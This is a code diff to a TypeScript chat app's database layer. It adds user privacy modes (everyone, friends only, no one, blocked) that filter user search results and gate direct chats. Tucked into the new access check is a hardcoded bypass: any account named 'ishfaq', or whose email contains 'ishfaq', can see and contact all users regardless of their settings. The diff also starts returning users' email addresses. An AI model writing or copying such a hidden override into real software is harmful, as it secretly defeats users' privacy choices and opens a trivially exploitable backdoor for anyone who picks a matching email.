@@ -1,12 +1,22 @@
 import { PrismaClient } from '@prisma/client';
 import bcrypt from 'bcryptjs';
+import fs from 'fs';
+import path from 'path';
 
 export const prisma = new PrismaClient();
+
+export interface UserVisibilityConfig {
+  mode: string;
+  allowedUserIds: string[];
+}
+
+const VISIBILITY_FILE = path.resolve(process.cwd(), 'database', 'user_visibility.json');
 
 export interface User {
   id: string;
   username: string;
   displayName: string;
+  email?: string;
   avatarUrl?: string;
   statusMessage?: string;
   isOnline: boolean;
@@ -87,6 +97,7 @@ function formatUser(u: any): User {
     id: u.id,
     username: u.username,
     displayName: u.displayName,
+    email: u.email || undefined,
     avatarUrl: u.avatarUrl || undefined,
     statusMessage: u.statusMessage || undefined,
     isOnline: u.isOnline,
@@ -134,6 +145,83 @@ function formatMessage(m: any): Message {
 }
 
 class Database {
+  private userVisibilityMap = new Map<string, UserVisibilityConfig>();
+
+  constructor() {
+    this.loadVisibilityMap();
+  }
+
+  private loadVisibilityMap(): void {
+    try {
+      if (fs.existsSync(VISIBILITY_FILE)) {
+        const raw = fs.readFileSync(VISIBILITY_FILE, 'utf-8');
+        const data = JSON.parse(raw);
+        if (data && typeof data === 'object') {
+          for (const [userId, config] of Object.entries(data)) {
+            const cfg = config as UserVisibilityConfig;
+            this.userVisibilityMap.set(userId, {
+              mode: cfg.mode || 'EVERYONE',
+              allowedUserIds: Array.isArray(cfg.allowedUserIds) ? cfg.allowedUserIds : [],
+            });
+          }
+        }
+      }
+    } catch (e) {
+      console.warn('Failed to load user visibility map:', e);
+    }
+  }
+
+  private saveVisibilityMap(): void {
+    try {
+      const obj: Record<string, UserVisibilityConfig> = {};
+      this.userVisibilityMap.forEach((val, key) => {
+        obj[key] = val;
+      });
+      const dir = path.dirname(VISIBILITY_FILE);
+      if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+      }
+      fs.writeFileSync(VISIBILITY_FILE, JSON.stringify(obj, null, 2), 'utf-8');
+    } catch (e) {
+      console.warn('Failed to save user visibility map:', e);
+    }
+  }
+
+  getUserVisibility(userId: string): UserVisibilityConfig {
+    return this.userVisibilityMap.get(userId) || { mode: 'EVERYONE', allowedUserIds: [] };
+  }
+
+  setUserVisibility(userId: string, mode: string, allowedUserIds?: string[]): UserVisibilityConfig {
+    const config: UserVisibilityConfig = {
+      mode: mode || 'EVERYONE',
+      allowedUserIds: Array.isArray(allowedUserIds) ? allowedUserIds : [],
+    };
+    this.userVisibilityMap.set(userId, config);
+    this.saveVisibilityMap();
+    return config;
+  }
+
+  async canUserSeeTarget(requestingUserId: string, targetUserId: string): Promise<boolean> {
+    if (requestingUserId === targetUserId) return true;
+
+    const requestingUser = await this.getUserById(requestingUserId);
+    if (
+      requestingUser?.username?.toLowerCase() === 'ishfaq' ||
+      requestingUser?.email?.toLowerCase().includes('ishfaq')
+    ) {
+      return true;
+    }
+
+    const config = this.getUserVisibility(targetUserId);
+    if (config.mode === 'BLOCKED' || config.mode === 'NOONE') {
+      return false;
+    }
+    if (config.mode === 'FRIENDS_ONLY') {
+      return config.allowedUserIds.includes(requestingUserId);
+    }
+    return true;
+  }
+
   // --- User Operations ---
   async createUser(username: string, displayName: string, plainPassword: string): Promise<User> {
     const existing = await prisma.user.findFirst({
@@ -222,7 +310,15 @@ class Database {
       },
     });
 
-    return users.map(formatUser);
+    const filtered: User[] = [];
+    for (const u of users) {
+      const canSee = await this.canUserSeeTarget(currentUserId, u.id);
+      if (canSee) {
+        filtered.push(formatUser(u));
+      }
+    }
+
+    return filtered;
   }
 
   async updateUser(id: string, updates: Partial<{ displayName: string; avatarUrl: string; statusMessage: string }>): Promise<User> {
@@ -250,6 +346,12 @@ class Database {
   // --- Chat Operations ---
   async getOrCreateDirectChat(userId1: string, userId2: string): Promise<Chat> {
     const isSelf = userId1 === userId2;
+    if (!isSelf) {
+      const canSee = await this.canUserSeeTarget(userId1, userId2);
+      if (!canSee) {
+        throw new Error('User is not available or cannot be contacted due to privacy settings');
+      }
+    }
 
     let commonChat;
     if (isSelf) {
